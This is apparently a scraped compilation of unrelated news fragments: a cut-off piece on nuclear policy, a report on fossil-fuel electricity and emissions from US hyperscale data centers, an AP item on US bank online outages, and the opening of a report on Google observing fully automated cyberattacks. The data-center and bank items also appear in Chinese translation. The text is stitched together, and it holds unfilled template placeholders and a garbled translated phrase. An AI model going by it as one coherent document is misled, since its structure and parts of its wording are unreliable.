It’s not totally unlike the Biden administration’s passage of the Civil Nuclear Credit Program in 2022, which planned to loan $6 billion to struggling nuclear companies in the US.
That’s not lost on Dominguez.

“Interestingly, in many respects the election had the Republicans saying a lot of the same things that the Democrats were saying,” Dominguez told investors on the call. “And I believe that the policy solutions are going to be somewhat similar.”

author: Justine Calma
article_content:
Fossil fuels are still the biggest source of electricity for hyperscale data centers in the US, a new paper published in the journal Nature Sustainability shows. They likely burn through more electricity collectively than many countries do, resulting in a serious amount of greenhouse gas emissions.

The study homes in on hyperscale facilities — the massive structures spanning millions of square feet that developers are racing to build in large part to support generative AI. Researchers say the findings show that there’s a lot of work left to do to cut down pollution stemming from AI’s reliance on fossil fuels.

“We tend to discuss AI’s environmental footprint as though it were some fixed property of the technology, when in reality the same computing infrastructure can have dramatically different consequences depending on the electricity system supporting it,” Gianluca Guidi, lead author of the new study and a postdoctoral fellow in the Department of Biostatistics at Harvard T.H. Chan School of Public Health, says in an email to The Verge. “I actually find that encouraging, because it means these impacts aren’t inevitable. We have choices about where we build and how we power this infrastructure.”

“The same computing infrastructure can have dramatically different consequences depending on the electricity system supporting it.”

Guidi and his team used satellite imagery to identify 403 hyperscale data centers in the US, estimating each facility’s power consumption based on its electrical capacity. Using data from the Environmental Protection Agency, they approximated how much carbon pollution each data center would have produced if connected to the local power grid between May 2024 and April 2025.

Altogether, the 403 hyperscale facilities likely consumed around 82 terawatt-hours of electricity that year, about 1.8 percent of all US electricity consumption. That’s even more than the amount of electricity that about 148 nations — a majority of the countries in the world including Austria, Israel, and Venezuela but excluding the largest economies including the US and China — individually burn through each year, according to John Sterman, director of the MIT System Dynamics group and MIT Sloan Sustainability Initiative.

Electricity demand from these data centers produced 25.7 million metric tons of CO2 emissions, comparable to the annual carbon footprint of Denmark, according to the research paper. Sterman says that exceeds the total carbon emissions of about 113 nations. That’s because about 54 percent of the electricity the hyperscale facilities consumed likely came from gas and coal.

Sterman, who was not involved in the research with Guidi, disclosed that he used the help of Claude to compare the paper’s findings to electricity use and emissions of countries. “I think AI can be extraordinarily helpful,” Sterman says. “But we’ve got to figure out a way to limit the harms … Especially because those impacts are irreversible. Once you allow these data centers to emit the CO2, you can never undo that.”

Sterman says policymakers should require data center operators to bring new clean energy online. The study doesn’t account for local air pollution that can result from new gas infrastructure that’s being built to meet data center demand, or gas turbines that some AI companies have installed at their facilities to power themselves without connecting to the grid. And while hyperscale data centers encompass more than just AI-related computing, they also make up just a fraction of the thousands of data centers in the US — with more cropping up each year.

The study showed how big a difference the local electricity mix makes when it comes to the environmental impact of AI and data centers. Generating electricity in heavily coal-reliant Wyoming led to roughly seven times more carbon emissions per kilowatt-hour than in hydropower-rich Oregon. “Two data centers consuming exactly the same amount of electricity can have dramatically different carbon footprints simply because of where they’re located,” Guidi writes.

Fengqi You, a professor in energy systems engineering at Cornell University who was also not involved in the study, says the results highlight the problem of “long-term carbon lock-in.” “Power plants and supporting infrastructure built to meet rapidly growing data center demand may operate for decades. Decisions made today could therefore shape emissions well into the future,” You says in an email to The Verge.

Both You and Guidi also pointed out how problematic it is that researchers have to go through such great lengths to estimate energy consumption because data center operators won’t disclose that information. To that end, Guidi and his colleagues are using their research to build a website to track the environmental impact of individual data centers. A bipartisan bill making its way through Congress could also mandate greater disclosures nationally on data centers’ electricity use.

“Communities and policymakers need reliable, independent data on what these facilities mean for our air, health, and the climate. This study is an important step.” Gina McCarthy, former White House national climate advisor and EPA administrator, said in a statement shared by the research authors.

article_content_zh:
《自然可持续发展》杂志上发表的一篇新论文显示，化石燃料仍然是美国超大规模数据中心的最大电力来源。它们消耗的电力可能比许多国家还要多，从而导致大量的温室气体排放。

这项研究的重点是超大规模设施——开发商竞相建造的占地数百万平方英尺的大型结构，很大程度上是为了支持生成式人工智能。研究人员表示，研究结果表明，要减少人工智能对化石燃料的依赖所造成的污染，还有很多工作要做。

“我们倾向于讨论人工智能的环境足迹，就好像它是该技术的某些固定属性一样，但实际上，根据支持它的电力系统，相同的计算基础设施可能会产生截然不同的后果，”这项新研究的主要作者、哈佛大学公共卫生学院生物统计学系博士后吉安卢卡·吉迪 (Gianluca Guidi) 说道。陈公共卫生学院在给 The Verge 的电子邮件中说道。 “我实际上发现这令人鼓舞，因为这意味着这些影响并非不可避免。我们可以选择在哪里建设以及如何为该基础设施提供动力。”

Guidi 和他的团队利用卫星图像识别了美国 403 个超大规模数据中心，并根据每个设施的电力容量估算了其功耗。他们利用环境保护局的数据，估算了 2024 年 5 月至 2025 年 4 月期间每个数据中心连接到当地电网时会产生多少碳污染。

当年，403 个超大规模设施总共消耗了约 82 太瓦时的电力，约占美国总电力消耗的 1.8%。麻省理工学院系统动力学小组和麻省理工学院斯隆可持续发展计划主任约翰·斯特曼表示，这甚至超过了约 148 个国家（包括奥地利、以色列和委内瑞拉等世界上大多数国家，但不包括美国和中国等最大经济体）每年单独消耗的电量。

研究论文称，这些数据中心的电力需求产生了 2570 万吨二氧化碳排放，与丹麦的年碳足迹相当。斯特曼表示，这超过了约 113 个国家的碳排放总量。这是因为超大规模设施消耗的电力中大约 54% 可能来自天然气和煤炭。

斯特曼没有参与吉迪的研究，他透露，他在克劳德的帮助下将该论文的研究结果与各国的电力使用和排放进行了比较。 “我认为人工智能非常有帮助，”斯特曼说。 “但我们必须找到一种方法来限制危害……特别是因为这些影响是不可逆转的。一旦你允许这些数据中心排放二氧化碳，你就永远无法挽回。”

斯特曼表示，政策制定者应该要求数据中心运营商提供新的清洁能源。该研究没有考虑到当地的空气污染，这些污染可能是由于为满足数据中心需求而建造的新天然气基础设施造成的，也没有考虑到一些人工智能公司在其设施中安装的燃气轮机在不连接电网的情况下自行供电所造成的污染。虽然超大规模数据中心不仅仅包含与人工智能相关的计算，但它们也只占美国数千个数据中心的一小部分——而且每年都会出现更多数据中心。

该研究表明，当地电力结构对人工智能和数据中心的环境影响有多大影响。严重依赖煤炭的怀俄明州每千瓦时发电的碳排放量是水力发电丰富的俄勒冈州的大约七倍。吉迪写道：“两个消耗完全相同电量的数据中心可能会因为所处位置的不同而产生截然不同的碳足迹。”

康奈尔大学能源系统工程系教授尤凤琪（Fengqi You）也没有参与这项研究，他表示，研究结果凸显了“长期碳锁定”的问题。 “为满足快速增长的数据中心需求而建造的发电厂和配套基础设施可能会运行数十年。因此，今天做出的决定可能会影响未来的排放，”尤在给 The Verge 的电子邮件中说道。

You和Guidi还指出，由于数据中心运营商不会披露这些信息，研究人员必须花费如此多的时间来估计能源消耗，这是多么有问题。为此，Guidi 和他的同事正在利用他们的研究成果建立一个网站来跟踪各个数据中心对环境的影响。国会通过的一项两党法案还可能要求全国范围内更多地披露数据中心的用电量。

“社区和政策制定者需要可靠、独立的数据来了解这些设施对我们的空气、健康和气候意味着什么。这项研究是重要的一步。”前白宫国家气候顾问兼美国环保署署长吉娜·麦卡锡在研究作者分享的一份声明中表示。

By CATHY BUSSEWITZ Updated [hour]:[minute] [AMPM] [timezone], [monthFull] [day], [year] --> Add AP News on Google Add AP News as your preferred source to see more of our stories on Google. --> Share

NEW YORK (AP) — Customers reported difficulty accessing the online accounts at some major U.S. banks Monday.

Bank of America, Chase, U.S. Bank, Wells Fargo and Truist were listed by users as down or experiencing issues, according to the website downdetector.com.

Chase Bank’s services are experiencing a technical bug issue, not a cyber issue, a spokesperson said Monday.

“Due to a technical issue, some transactions are taking longer than usual to complete but customers still have access to their accounts and funds,” a Chase spokesperson said in a statement. “We are working to resolve this as quickly as possible.”

A spokesman from U.S. Bank said its systems are not directly impacted, however, “clients attempting to send or receive Zelle payments with another financial institution may experience transaction delays.”

Zelle’s network operator is a company called Early Warning Services, which is owned by financial institutions including Bank of America, Capital One, JPMorgan Chase, PNC Bank, Truist, U.S. Bank, and Wells Fargo.

Some Chase customers received a message that said “Some services aren’t available. We’re working on them. Please try back later.”

The reports follow a major outage by Microsoft that began Friday and lasted for hours which impacted services including Outlook, Teams and AI assistant Copilot.

纽约（美联社）——周一，客户报告称在美国一些主要银行访问在线账户时遇到困难。

据 downDetector.com 网站称，美国银行、大通银行、合众银行、富国银行和 Truist 被用户列为宕机或遇到问题的银行。

一位发言人周一表示，大通银行的服务遇到了技术错误问题，而不是网络问题。

大通发言人在一份声明中表示：“由于技术问题，一些交易需要比平时更长的时间才能完成，但客户仍然可以访问他们的账户和资金。” “我们正在努力尽快解决这个问题。”

美国合众银行发言人表示，其系统并未受到直接影响，但“尝试与其他金融机构发送或接收 Zelle 付款的客户可能会遇到交易延迟。”

Zelle 的网络运营商是一家名为 Early Warning Services 的公司，该公司的所有者包括美国银行、第一资本、摩根大通、PNC 银行、Truist、合众银行和富国银行等金融机构。

一些大通银行客户收到一条消息，内容为“某些服务不可用。我们正在处理这些服务。请稍后再试。”

这些报告是在微软从周五开始并持续数小时的一次重大故障之后发布的，影响了包括 Outlook、Teams 和 AI 助理 Copilot 在内的服务。

title: Google warns that fully automated cyberattacks have arrived and will get worse fast
title_en: Google warns that fully automated cyberattacks have arrived and will get worse fast
author: Matthias Bastian
article_content:
Google's Threat Intelligence Group (GTIG) says it has observed attackers fully automating vulnerability discovery and exploitation for the first time, with no human in the loop. GTIG found an exposed server running an AI framework called "exploit_agent"that connects to multiple language models, according to the GTIG AI Threat Tracker. The system compares software code before and after patches, identifies vulnerabilities, develops exploits, and runs them automatically. Russian-language comments in the configuration files suggest the operator speaks Russian.

Server data suggests the operator targeted French websites in media, entertainment, and education. GTIG calls the shift a critical turning point but says these automated attacks currently sacrifice stealth for speed, leaving forensic traces that make them easier to detect.
